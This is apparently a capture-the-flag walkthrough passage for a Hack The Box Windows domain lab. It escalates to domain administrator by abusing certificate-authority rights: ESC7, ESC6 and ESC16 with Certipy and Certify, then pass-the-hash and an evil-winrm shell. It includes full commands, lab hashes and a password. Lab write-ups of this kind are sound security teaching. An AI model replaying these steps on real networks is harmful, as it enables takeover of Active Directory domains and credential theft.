oxdf@hacky$ certipy ca -ca 'fries-DC01-CA' -add-officer 'gMSA_CA_prod' -u 'gMSA_CA_prod$' -hashes b0f2883453608fb7bffd1ac2e0e18188 -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'
```

Next I’ll enable the `SubCA` template on the CA. It’s a built-in template that only Domain and Enterprise Admins can enroll in, but as a CA officer I can submit a request against it and then issue that (denied) request myself. The `SubCA` template is disabled by default (it isn’t in the published template list), so I’ll enable it:

```console
oxdf@hacky$ certipy ca -ca 'fries-DC01-CA' -enable-template 'SubCA' -u 'gMSA_CA_prod$' -hashes b0f2883453608fb7bffd1ac2e0e18188 -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'fries-DC01-CA'
```

Now I’ll request a certificate against this template:

```console
oxdf@hacky$ certipy req -ca 'fries-DC01-CA' -template 'SubCA' -upn 'administrator@fries.htb' -u 'gMSA_CA_prod$' -hashes b0f2883453608fb7bffd1ac2e0e18188 -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 44
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '44.key'
[*] Wrote private key to '44.key'
[-] Failed to request certificate
```

The failed request is expected. Typically only Admins can approve. But with `Manage Certificates` rights, I should be able to approve:

```console
oxdf@hacky$ certipy ca -ca 'fries-DC01-CA' -issue-request 44 -u 'gMSA_CA_prod$' -hashes b0f2883453608fb7bffd1ac2e0e18188 -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[-] Access denied: Insufficient permissions to issue certificate
```

It fails (where in Manager this did not). From my shell, `certutil` can show why:

```console
evil-winrm-py PS C:\> certutil -getreg CA\Security HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\Security:

  Security REG_BINARY =
    Deny Certificate Manager    FRIES\gMSA_CA_prod$
    Deny Certificate Manager    FRIES\Domain Users
    Deny Certificate Manager    FRIES\Domain Computers
    Allow Enroll        NT AUTHORITY\Authenticated Users
    Allow CA Administrator Enroll       FRIES\gMSA_CA_prod$
    Allow CA Administrator Certificate Manager  FRIES\Domain Admins
    Allow Enroll        FRIES\Domain Users
    Allow Enroll        FRIES\Domain Computers
    Allow CA Administrator Certificate Manager  FRIES\Enterprise Admins
    Allow CA Administrator Certificate Manager  BUILTIN\Administrators

CertUtil: -getreg command completed successfully.
```

There’s an explicit `Deny Certificate Manager` on both the gMSA_CA_prod$ user account, as well as all Domain Users and Domain Computers.

Deny ACEs are evaluated before allow ACEs in a Windows security descriptor, so this deny on `Certificate Manager` overrides the officer permission that `add-officer` granted. That’s a deliberate block on the standard ESC7 officer path, and the difference from Manager.

### Strategy

The deny only applies to `Certificate Manager`, though. `gMSA_CA_prod$` still holds `CA Administrator` (`ManageCA`) and `Enroll`, with no deny on either. `ManageCA` isn’t just for adding officers. It also brings administrative control over the CA’s configuration, including the CA policy flags, and abusing it that way never touches the `Certificate Manager` right that’s denied.

As CA administrator I can introduce a misconfiguration, which means I can pick whichever one I want. Three options jump out:

- ESC6 - set the `EDITF_ATTRIBUTESUBJECTALTNAME2` policy flag so the CA honors a requester-supplied SAN on any request.
- ESC16 - add the SID security extension OID (`1.3.6.1.4.1.311.25.2`) to the CA’s `DisableExtensionList` so the CA stops binding certificates to a SID at all.
- ESC11 - disable `IF_ENFORCEENCRYPTICERTREQUEST` to allow relaying certificate requests.

None of these need the `Certificate Manager` right that’s denied. ESC11 seems the most complex, so I’ll deprioritize that.

The shortest path is ESC6, but there’s a twist. ESC6 works by injecting a Subject Alternative Name, and since [KB5014754](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16) (released 10 May 2022) domain controllers can instead bind a certificate to an account by an embedded SID (the `szOID_NTDS_CA_SECURITY_EXT` extension) rather than trusting the SAN.

This is explicitly called out on the [Certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc6):

> In modern, patched Active Directory environments - specifically, those with CAs and DCs that have received the May 2022 security updates addressing Certifried/CVE-2022-26923 and later - ESC6 *alone* is generally not sufficient for privilege escalation if certificates include the `szOID_NTDS_CA_SECURITY_EXT` (SID security extension). This is because the KDC prioritizes the SID from this security extension for mapping the certificate to an account during Kerberos PKINIT authentication. If an attacker uses ESC6 to inject a UPN for `Administrator` and a SID for `Administrator` into the SAN of a certificate, but the certificate is legitimately issued for the attacker’s own account (and thus the SID security extension contains the attacker’s SID), the KDC will use the attacker’s SID, preventing impersonation. However, ESC6 becomes a potent component of an attack chain when combined with:  ESC9 (No Security Extension on Template): A certificate template is configured *not* to include the SID security extension. ESC16 (Security Extension Disabled on CA): The CA itself is configured *not* to include the SID security extension in *any* issued certificates.

With access to ESC7, I can enable ESC16, so the way around that is to chain in ESC16, using it to disable the SID extension CA-wide so the DC has nothing to bind to and falls back to the SAN I inject.

### ESC7 + ESC6 + ESC16

#### Enable ESC6

`certipy` doesn’t have a great way to enable ESC6 using `ManageCA` privilege, which makes sense, as ESC6 is a configuration of the CA, rather than abusing a misconfigured template. Enabling ESC6 is actually modifying a registry value that I get access to write because of the `ManageCA` privilege.

The [Certify](https://github.com/GhostPack/Certify) tool runs on the host and does have the ability to make these changes. I’ll download the [latest from SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe), upload it over my `evil-winrm-py` shell, and run it:

```console
evil-winrm-py PS C:\ProgramData> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc6

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v2.0.0

[*] Action: Manage a certificate authority

[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
[*] Successfully set the EditFlags configuration on the CA.

[*] Attempting to restart the CA service.
[*] Successfully stopped the CA service.
[*] Successfully restarted the CA service.

Certify completed in 00:00:00.5833282
```

The `--esc6` flag toggles `EDITF_ATTRIBUTESUBJECTALTNAME2`, so running it again would make the host not vulnerable again.

I’ll verify it’s set with `certutil`:

```console
evil-winrm-py PS C:\ProgramData> certutil -getreg policy\EditFlags
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 15014e (1376590)
    EDITF_REQUESTEXTENSIONLIST -- 2
    EDITF_DISABLEEXTENSIONLIST -- 4
    EDITF_ADDOLDKEYUSAGE -- 8
    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
    EDITF_ENABLEAKIKEYID -- 100 (256)
    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
CertUtil: -getreg command completed successfully.
```

`EDITF_ATTRIBUTESUBJECTALTNAME2` is there and set to 40000.

`certipy` shows it as vulnerable to ESC6 now as well:

```console
oxdf@hacky$ certipy find -u 'gMSA_CA_prod$' -hashes b0f2883453608fb7bffd1ac2e0e18188 -dc-ip 10.129.244.72 -stdout -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fries-DC01-CA
    DNS Name                            : DC01.fries.htb
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
    Certificate Validity End            : 3024-05-19 14:11:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        ManageCertificates              : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
    [+] User Enrollable Principals      : FRIES.HTB\Domain Users
                                          FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Authenticated Users
                                          FRIES.HTB\Domain Computers
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC6                              : Enrollee can specify SAN.
      ESC7                              : User has dangerous permissions.
    [*] Remarks
      ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

#### ESC6 [Fail]

To exploit ESC6, I’ll request a certificate that works for authentication for a user that I control with the `upn` and SID (I can get this from BloodHound) matching the administrator account. When I try before enabling ESC6, it returns a certificate for svc_infra:

```console
oxdf@hacky$ certipy req -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target DC01.fries.htb -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 51
[*] Successfully requested certificate
[*] Got certificate with UPN 'svc_infra@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-3601'
[*] Saving certificate and private key to 'svc_infra.pfx'
[*] Wrote certificate and private key to 'svc_infra.pfx'
```

However, with ESC6, it returns one for administrator:

```console
oxdf@hacky$ certipy req -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target DC01.fries.htb -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 50
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[!] Conflicting SIDs found in certificate:
[!]     SAN URL:            'S-1-5-21-858338346-3861030516-3975240472-500'
[!]     Security Extension: 'S-1-5-21-858338346-3861030516-3975240472-3601'
[!] Windows will use the security extension SID for authentication purposes
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-3601'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

However, there’s still an issue, and it’s this line:

```console
[!]     Security Extension: 'S-1-5-21-858338346-3861030516-3975240472-3601'
```

The security extension is attaching the SID of svc_infra. That means when I go to use it, the DC recognizes the mismatch and fails:

```console
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*]     Security Extension SID: 'S-1-5-21-858338346-3861030516-3975240472-3601'
[!] Conflicting SIDs found in certificate:
[!]     SAN URL:            'S-1-5-21-858338346-3861030516-3975240472-500'
[!]     Security Extension: 'S-1-5-21-858338346-3861030516-3975240472-3601'
[!] Windows will use the security extension SID for authentication purposes
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] Verify that user 'administrator' has object SID 'S-1-5-21-858338346-3861030516-3975240472-3601'
[-] See the wiki for more information
```

It uses the security extension for id instead of the SAN, and thus can’t authenticate as administrator.

#### Enable ESC16

ESC6 alone fails because the CA still stamps the SID security extension with svc_infra’s SID. I’ll use `Certify` again, this time with `--esc16`, to add the `szOID_NTDS_CA_SECURITY_EXT` OID (`1.3.6.1.4.1.311.25.2`) to the CA’s `DisableExtensionList`. That stops the CA embedding a SID in any certificate it issues:

```console
evil-winrm-py PS C:\programdata> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc16

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v2.0.0

[*] Action: Manage a certificate authority

[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
[*] Successfully set the DisableExtensionList configuration on the CA.

[*] Attempting to restart the CA service.
[*] Successfully stopped the CA service.
[*] Successfully restarted the CA service.

Certify completed in 00:00:00.5737667
```

`certutil` confirms the OID is now in `DisableExtensionList`:

```console
evil-winrm-py PS C:\programdata> certutil -getreg policy\DisableExtensionList
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList:

  DisableExtensionList REG_MULTI_SZ =
    0: 1.3.6.1.4.1.311.25.2
CertUtil: -getreg command completed successfully.
```

#### ESC6

With the SID extension disabled CA-wide, I’ll request the certificate again, exactly like above:

```console
oxdf@hacky$ rm administrator.pfx
oxdf@hacky$ certipy req -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target DC01.fries.htb -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 57
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

There’s no mention of the security extension this time. I’ll use it to auth (this is also the first time it’s been important to have my VM clock synced with the DC, so `sudo ntpdate dc01.fries.htb` if necessary):

```console
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.129.244.72
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

It dumps the hashes for the administrator account.

### Shell

`netexec` shows the hash works:

```console
oxdf@hacky$ netexec smb DC01.fries.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [+] fries.htb\administrator:a773cb05d79273299a684a23ede56748 (Pwn3d!)
oxdf@hacky$ netexec winrm DC01.fries.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
WINRM       10.129.244.72   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
WINRM       10.129.244.72   5985   DC01             [+] fries.htb\administrator:a773cb05d79273299a684a23ede56748 (Pwn3d!)
```

I’ll get a shell as administrator:

```console
oxdf@hacky$ evil-winrm-py -i DC01.fries.htb -u administrator -H a773cb05d79273299a684a23ede56748
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.fries.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

And grab the root flag:

```console
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
82292d3a************************
```
